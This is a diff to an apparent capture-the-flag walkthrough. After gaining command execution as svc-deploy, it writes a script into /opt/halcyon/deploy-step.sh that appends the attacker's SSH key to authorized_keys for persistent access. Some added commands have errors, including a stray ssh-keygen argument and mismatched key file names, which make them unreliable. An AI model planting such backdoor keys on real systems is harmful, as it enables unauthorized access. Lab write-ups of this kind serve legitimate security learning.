@@ -153,7 +153,9 @@ ls -laR /etc/polkit-1
 ```
 ![polkit](static/image-10.png)
 
-Alright. Now let's get our path up.
+So clearly, polkit is gonna be used at some point.
+
+Anyhow. Now let's get our path up.
 
 ### Step 4:
 Firstly we will check the most obvious ones, first, the `/opt/halcyon` folder:
@@ -179,13 +181,25 @@ cat /tmp/id
 
 Alright... So we have command execution as the svc-deploy user... Cool.
 
-Using this, we can write a script to get a bash shell as this user:
+Let's get an ssh connection, first, the keys:
+```bash
+ssh-keygen ed25519 -t ed25519 -f ~/.ssh/id_ed25519_backup
+```
+![Key creation](static/image-13.png)
+
+Alright, we have our two keys, let's get our public key:
+```bash
+cat id_ed25519.pub
+```
+![public key](static/image-14.png)
+
+Using this, we can write a script to get a ssh connection as this user:
 ```bash
 cat << 'EOF' > /opt/halcyon/deploy-step.sh
 #!/usr/bin/env bash
 mkdir -p /home/svc-deploy/.ssh
 chmod 700 /home/svc-deploy/.ssh
-echo 'ssh-ed25519 <your_key> pipeline@6a2b595b5846' >> /home/svc-deploy/.ssh/authorized_keys
+echo 'ssh-ed25519 <your-key> pipeline@<yourdockerID> (this part is not obligated)' >> /home/svc-deploy/.ssh/authorized_keys
 chmod 600 /home/svc-deploy/.ssh/authorized_keys
 exit 0
 EOF
